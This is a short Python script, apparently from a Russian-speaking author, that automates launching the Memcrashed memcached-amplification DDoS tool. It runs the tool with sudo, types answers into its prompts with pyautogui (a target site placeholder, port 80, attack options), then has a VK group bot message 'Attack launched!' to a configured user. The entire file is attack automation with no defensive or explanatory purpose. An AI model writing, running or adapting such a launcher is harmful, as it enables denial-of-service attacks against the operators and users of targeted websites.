import subprocess
import os
import time
import pyautogui
import vk_api
import random
from vk_api.bot_longpoll import VkBotLongPoll, VkBotEventType

vk_session = vk_api.VkApi(token='')
longpoll_bot = VkBotLongPoll(vk_session, 'id group')
vk = vk_session.get_api()

def get_config (whats) :
	os.chdir("/home/noname/config_bot")
	do_config = open('config.txt', 'r')
	from_id = do_config.read()
	print(from_id)
	do_config.close()
	if whats == 'from_id' :
		return from_id
	elif whats == 'chat_id' :
		return 1

os.chdir("/home/noname/Memcrashed-DDoS-Exploit/")
list_dir = subprocess.Popen(['sudo','python3', 'Memcrashed.py'])
time.sleep(1)
pyautogui.typewrite('y')
pyautogui.press('enter')
time.sleep(5)
pyautogui.typewrite('y')
pyautogui.press('enter')
time.sleep(1)
pyautogui.typewrite('y')
pyautogui.press('enter')
time.sleep(1)
pyautogui.typewrite('site name')
pyautogui.press('enter')
time.sleep(1)
pyautogui.typewrite('80')
pyautogui.press('enter')
time.sleep(1)
pyautogui.typewrite('1')
pyautogui.press('enter')
time.sleep(1)
pyautogui.typewrite('1')
pyautogui.press('enter')
time.sleep(1)
pyautogui.typewrite('n')
pyautogui.press('enter')
time.sleep(1)
pyautogui.typewrite('y')
pyautogui.press('enter')

vk.messages.send(
		random_id=random.getrandbits(30),
		peer_id=get_config('from_id'),
		message='Атака запущена!'
		)

list_dir.wait()
list_dir.close()

